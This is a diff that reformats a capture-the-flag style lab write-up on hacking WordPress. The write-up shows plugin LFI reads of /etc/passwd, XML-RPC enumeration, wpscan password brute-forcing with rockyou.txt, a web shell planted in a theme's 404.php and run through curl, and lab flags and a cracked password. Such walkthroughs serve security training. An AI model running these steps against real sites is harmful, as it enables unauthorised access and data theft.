@@ -78,7 +78,7 @@ This module explores the complete WordPress attack lifecycle. We perform detaile
 
 #### Technical Methodology & Exploit Execution:
 
-http://<target-IP>:<target-port>/wp-content/plugins/mail-
+`http://<target-IP>:<target-port>/wp-content/plugins/mail-`
 masta/inc/flag.txt
 
 ![Figure 1.1 — Lab execution and output verification (Page 1)](/assets/images/posts/htb-academy/hacking-wordpress/p001_01.jpg)
@@ -116,14 +116,14 @@ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
 
 we run the curl command:
 ```bash
-curl -X POST http://<target-IP>:<target-port>/xmlrpc.php
-```
--H "Content-Type: text/xml"      --data '<?xml
-version="1.0"?>
+curl -X POST `http://<target-IP>:<target-port>/xmlrpc.php` \
+-H "Content-Type: text/xml" \
+--data '<?xml version="1.0"?>
 <methodCall>
 <methodName>system.listMethods</methodName>
 <params></params>
 </methodCall>' | grep '/string' | wc -l
+```
 
 ![Figure 3.1 — Lab execution and output verification (Page 3)](/assets/images/posts/htb-academy/hacking-wordpress/p003_01.jpg)
 *_Figure 3.1 — Lab execution and output verification (Page 3)_*
@@ -141,8 +141,7 @@ version="1.0"?>
 
 Method 1:
 We go to
-http://<target-IP>:<target-port>/wp-content/plugins/photo-
-gallery/readme.txt
+`http://<target-IP>:<target-port>/wp-content/plugins/photo-gallery/readme.txt`
 
 
 
@@ -152,8 +151,8 @@ First, we need An API token which can be received from 'https://wpscan.com/'
 And we run:
 ```bash
 wpscan --url http://<target-IP>:<target-port> --enumerate --
-```
 api-token <api-key> > output.txt
+```
 
 then we read the output file:
 ```bash
@@ -179,10 +178,9 @@ cat output.txt | grep photo-gallery
 
 we run the command:
 ```bash
-curl http://<target-IP>:<target-port>/wp-
-```
-content/plugins/mail-
+curl http://<target-IP>:<target-port>/wp-content/plugins/mail-
 masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep
+```
 bash
 
 ![Figure 5.1 — Lab execution and output verification (Page 5)](/assets/images/posts/htb-academy/hacking-wordpress/p005_01.jpg)
@@ -202,8 +200,8 @@ bash
 we will use the rockyou.txt password wordlist:
 ```bash
 wpscan --password-attack xmlrpc -t 20 -U roger -P
+rockyou.txt --url http://`<target-IP>`:`<target-port>`
 ```
-rockyou.txt --url http://<target-IP>:<target-port>
 
 
 *
@@ -227,7 +225,7 @@ rockyou.txt --url http://<target-IP>:<target-port>
 #### Technical Methodology & Exploit Execution:
 
 lets login:
-http://<target-IP>:<target-port>/wp-admin
+`http://<target-IP>:<target-port>/wp-admin`
 
 
 →
@@ -246,8 +244,7 @@ system($_GET['cmd']);
 And update the file.
 
 All we have to do is to access the
-http://<target-IP>:<target-port>/wp-
-content/themes/twentyseventeen/404.php?cmd=cat%20/home/wp-
+`http://<target-IP>:<target-port>/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/wp-`
 user/flag.txt
 
 ![Figure 8.1 — Lab execution and output verification (Page 8)](/assets/images/posts/htb-academy/hacking-wordpress/p008_01.jpg)
@@ -272,7 +269,7 @@ We will link the target IP to inlanefreight.local and in /etc/hosts
 And attempt to go to 'blog':
 
 We will link blog.inlanefreight.local to the target-IP in /etc/hosts as well:
-<target-IP> inlanefreight.local blog.inlanefreight.local
+`<target-IP>` inlanefreight.local blog.inlanefreight.local
 
 
 And re-enter the sub-domain:
@@ -293,8 +290,8 @@ And re-enter the sub-domain:
 Now lets run a scan on it, and save the output in output.txt:
 ```bash
 wpscan --url http://blog.inlanefreight.local --enumerate --
-```
 api-token <api-token> > output.txt
+```
 
 
 
@@ -342,8 +339,7 @@ Method: we will use dirbuster, and the wordlist
 
 
 The flag was found in '/wp-content/uploads/upload.txt. lets enter it:
-http://blog.inlanefreight.local/wp-
-content/uploads/upload_flag.txt
+`http://blog.inlanefreight.local/wp-content/uploads/upload_flag.txt`
 
 ![Figure 12.1 — Lab execution and output verification (Page 12)](/assets/images/posts/htb-academy/hacking-wordpress/p012_01.jpg)
 *_Figure 12.1 — Lab execution and output verification (Page 12)_*
@@ -355,7 +351,7 @@ content/uploads/upload_flag.txt
 
 ### look for the user's section
 
-> **Lab Question (Page 13)**: Identify the only non-admin WordPress user. (Format: <first-name> <last-name>)
+> **Lab Question (Page 13)**: Identify the only non-admin WordPress user. (Format: `<first-name>` `<last-name>`)
 >
 > **Flag / Answer**: `Charlie Wiggins`
 {: .prompt-info }
@@ -431,10 +427,9 @@ Site-Editor plugin version 1.1.1 is LFI vulnerable
 we use the local file inclusion (LFI) vulnerability found in the previous
 question:
 ```bash
-curl -s "http://blog.inlanefreight.local/wp-
-```
-content/plugins/site-
+curl -s "http://blog.inlanefreight.local/wp-content/plugins/site-
 editor/editor/extensions/pagebuilder/includes/ajax_shortcode
+```
 _pattern.php?ajax_path=/etc/passwd" | grep '/bash'
 
 
@@ -446,8 +441,8 @@ Method: Lets bruteforce Erika password using rockyou.txt In the same manner
 we did in 'Attacking WordPress Users' section:
 ```bash
 wpscan --password-attack xmlrpc -t 20 -U erika -P
-```
 rockyou.txt --url http://blog.inlanefreight.local
+```
 
 
 *
@@ -470,7 +465,7 @@ The credentials are Erika:010203
 
 Now lets login to Erika's account:
 
-http://blog.inlanefreight.local/wp-login.php
+`http://blog.inlanefreight.local/wp-login.php`
 and enter the credentials:
 
 We are in! we will proceed to follow the steps we did in 'Remote Code
@@ -478,18 +473,16 @@ Execution (RCE) via the Theme Editor' section (the steps will not be re-shown
 here).
 When we are done – we will list the files in '/home/erika':
 ```bash
-curl http://blog.inlanefreight.local/wp-
+curl http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home/erika
 ```
-content/themes/twentyseventeen/404.php?cmd=ls%20/home/erika
 
 
 
 Then request for the flag – 'd0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt':
 ```bash
-curl http://blog.inlanefreight.local/wp-
-```
-content/themes/twentyseventeen/404.php?cmd=cat%20/home/erika
+curl http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/erika
 /d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
+```
 
 ![Figure 17.1 — Lab execution and output verification (Page 17)](/assets/images/posts/htb-academy/hacking-wordpress/p017_01.png)
 *_Figure 17.1 — Lab execution and output verification (Page 17)_*
